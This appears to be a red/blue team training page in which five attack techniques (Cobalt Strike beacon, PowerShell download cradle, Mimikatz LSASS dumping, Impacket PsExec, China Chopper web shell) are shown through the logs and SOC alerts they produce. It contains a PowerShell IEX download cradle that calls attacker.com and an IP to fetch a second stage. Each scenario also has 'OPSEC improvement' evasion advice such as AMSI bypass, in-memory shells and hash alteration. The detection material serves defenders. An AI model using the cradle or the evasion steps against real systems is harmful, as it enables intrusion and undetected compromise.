---
layout: training-page
title: "How I Got Caught — Red Team Detection Scenarios"
module: "Scenarios"
tags:
  - detection
  - artifacts
  - soc-perspective
  - opsec
  - evasion-failure
  - blue-team
page_key: "scenarios-how-i-got-caught"
render_with_liquid: false
---

# How I Got Caught — SOC Detection Scenarios

Five red team techniques, examined from the defender's perspective. For each: what the attacker did, exactly what got logged, what the SOC analyst saw on their screen, and what OPSEC change would have avoided the detection.

---

## Scenario 1: Cobalt Strike HTTP Beacon

### What the attacker did
Deployed a Cobalt Strike beacon using the default HTTP listener profile. Beacon phoned home every 60 seconds to `104.21.x.x:80` with HTTP GET requests.

### What got logged
```
# Sysmon EventID 1 — Process Create
ParentImage:  C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
Image:        C:\Windows\System32\rundll32.exe
CommandLine:  rundll32.exe  (no arguments — anomalous)

# Sysmon EventID 3 — Network Connection
Image:        C:\Windows\System32\rundll32.exe
DestinationIp: 104.21.x.x
DestinationPort: 80
Initiated:    true

# Sysmon EventID 8 — CreateRemoteThread
SourceImage:  C:\Windows\System32\rundll32.exe
TargetImage:  C:\Windows\System32\notepad.exe
(reflective DLL injection into notepad)

# CrowdStrike alert: "Reflective DLL injection detected"
# JA3 TLS fingerprint: 72a7c4bc836c75b1c5e3e4e5c23e94bc (default CS JA3)
# User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
# URI pattern: /jquery-3.3.2.slim.min.js (default CS profile path)
```

### What the SOC analyst saw
SIEM alert: "Suspicious parent-child process — WINWORD spawning rundll32 with no arguments." Pivot to Sysmon logs confirms network connection from rundll32 to external IP. JA3 fingerprint matches known Cobalt Strike default profile in threat intel feed. Alert severity: Critical.

### OPSEC improvement
Use a custom Malleable C2 profile with legitimate User-Agent (match target org's browser fleet), change URI patterns to mimic a real CDN resource path, use process injection into a browser process instead of rundll32, sign the beacon binary.

---

## Scenario 2: PowerShell Download Cradle

### What the attacker did
Executed a standard download cradle from a phishing macro:
```
powershell.exe -enc <base64>
# Decoded: IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')
```

### What got logged
```
# Windows Event 4104 — Script Block Logging
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')
# (Logged even if encoded — PowerShell decodes before logging)

# AMSI provider log (Defender/CrowdStrike AMSI hook):
AmsiScanResult: DETECTED
Content: [decoded payload string matched signature]

# Sysmon EventID 3 — Network Connection
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
DestinationIp: 10.10.14.5
DestinationPort: 80
Initiated:    true

# Windows Event 4688 — Process Create (with command line logging)
CommandLine: powershell.exe -enc SQBFAFgA...
```

### What the SOC analyst saw
AMSI alert fires immediately — the decoded payload matched a known IEX download cradle signature. Script block logging captured the full decoded command even though it was base64-encoded at the command line. SOC sees: source process (winword.exe), spawned PowerShell, network connection to external IP within 3 seconds of email open.

### OPSEC improvement
Use AMSI bypass before the download cradle (patch AMSI via reflection — avoid the scan entirely), use HTTPS with a valid certificate, avoid `IEX` and `DownloadString` strings (use aliases, `[System.Net.WebRequest]::Create()`, or COM objects like `Msxml2.XMLHTTP`), consider direct syscall-based HTTP without PowerShell.

---

## Scenario 3: LSASS Credential Dumping

### What the attacker did
Ran `sekurlsa::logonpasswords` via Mimikatz (rundll32-loaded) targeting lsass.exe.

### What got logged
```
# Sysmon EventID 10 — Process Access
SourceImage:   C:\Windows\System32\rundll32.exe
TargetImage:   C:\Windows\System32\lsass.exe
GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
CallTrace:     C:\Windows\SYSTEM32\ntdll.dll+...

# Windows Defender alert:
Threat: HackTool:Win32/Mimikatz.A
File:   C:\Windows\Temp\m.exe

# CrowdStrike alert:
"LSASS memory access from suspicious process"
"PPL protection violation attempt"

# Windows Event 4656 — Handle requested for lsass (Object Access auditing)
ProcessName: rundll32.exe
ObjectName:  \Device\HarddiskVolume3\Windows\System32\lsass.exe
AccessMask:  0x1010
```

### What the SOC analyst saw
Two simultaneous alerts: Windows Defender signature match on the Mimikatz binary, and EDR alert on LSASS process access with VM_READ permissions from rundll32. PPL (Protected Process Light) blocked the read and generated an access-denied event. SOC pivot shows the full process tree from the initial phishing email.

### OPSEC improvement
Use indirect LSASS dumping (comsvcs.dll MiniDump via Task Manager parent spoofing, or `nanodump`/`silentprocessexit`), avoid writing Mimikatz to disk (reflective load only), target LSA Secrets via registry instead of LSASS memory, use DCSync (remote LSASS via replication) if you have sufficient AD privileges.

---

## Scenario 4: PsExec Lateral Movement

### What the attacker did
Used `psexec.py` from Impacket to move laterally from WORKSTATION-01 to FILE-SERVER-03 using a captured NTLM hash.

### What got logged
```
# Sysmon EventID 17 — Pipe Created
PipeName: \PSEXESVC
Image:    C:\Windows\PSEXESVC.exe

# Sysmon EventID 18 — Pipe Connected
PipeName: \PSEXESVC

# Windows Event 7045 — Service Installed
ServiceName: PSEXESVC
ServiceFileName: C:\Windows\PSEXESVC.exe
ServiceType:  user mode service
StartType:    demand start
AccountName:  LocalSystem

# Windows Event 4624 — Logon (Type 3 — Network)
LogonType:    3
AuthPackage:  NTLM   (NOT Kerberos — anomalous in domain environment)
WorkstationName: WORKSTATION-01
TargetUserName:  Administrator

# SMB: ADMIN$ share access logged in file server event log
# Network: SMB connection on port 445 from WORKSTATION-01 to FILE-SERVER-03
```

### What the SOC analyst saw
Correlation rule triggered: "NTLM authentication on port 445 in a Kerberos domain + service installation event within 30 seconds." SIEM shows the ADMIN$ share access, then PSEXESVC service creation, then PSEXESVC named pipe. All timestamps within a 5-second window — textbook PsExec signature.

### OPSEC improvement
Use Kerberos (pass-the-ticket) instead of NTLM, use WMI or DCOM lateral movement instead of service-based execution, avoid named pipe `\PSEXESVC` by using a custom service name with `sc.exe`, or use `smbexec` (file-less, runs commands via service that writes to an output file) or `atexec` (scheduled task-based, less noisy pipe).

---

## Scenario 5: Web Shell Persistence

### What the attacker did
Uploaded a China Chopper web shell to a vulnerable ASP.NET application as `update.aspx`.

### What got logged
```
# IIS Access Log anomaly:
2026-05-04 13:45:22 10.10.14.5 POST /uploads/update.aspx 200 1024 512
# Large POST (512 bytes body) to .aspx in uploads directory — never seen before

# Sysmon EventID 11 — File Create
Image:        C:\Windows\System32\inetsrv\w3wp.exe
TargetFilename: C:\inetpub\wwwroot\uploads\update.aspx
# w3wp.exe writing .aspx file = web shell upload

# Sysmon EventID 1 — Process Create (triggered by shell command)
ParentImage:  C:\Windows\System32\inetsrv\w3wp.exe
Image:        C:\Windows\System32\cmd.exe
CommandLine:  cmd.exe /c whoami

# Windows Defender:
Threat: Backdoor:ASP/ChinaChopper.B
# Hash of update.aspx matched threat intel feed

# EventID 4688 — w3wp spawning cmd.exe (anomalous parent-child)
```

### What the SOC analyst saw
Three alerts within seconds of each other: IIS log spike showing first-ever POST to `/uploads/update.aspx`, Sysmon alert on `w3wp.exe` writing an `.aspx` file to the web root, and Windows Defender signature match on the file hash. The parent-child relationship `w3wp.exe → cmd.exe` is a one-click pivot to the full attack chain.

### OPSEC improvement
Use an in-memory web shell that doesn't write to disk (load assembly via reflection on an existing `.aspx` page), use HTTPS and a non-standard user-agent for C2 traffic from the shell, avoid obvious file names and locations, pick a file hash not in public threat intel feeds (modify the shell slightly), use a legitimate-looking `.aspx` page name matching existing application routes.

---

## Resources

- Sysmon configuration reference — `github.com/SwiftOnSecurity/sysmon-config`
- Cobalt Strike malleable C2 profiles — `github.com/threatexpress/malleable-c2`
- LSASS dumping techniques comparison — `blog.xpnsec.com/exploring-mimikatz-part-1`
- PsExec detection and evasion — `ired.team/offensive-security/lateral-movement`
- Web shell detection — CISA advisory `AA21-131A` (web shells in the wild)
- ATT&CK Detection mappings — `attack.mitre.org` (each technique has Detection subsection)
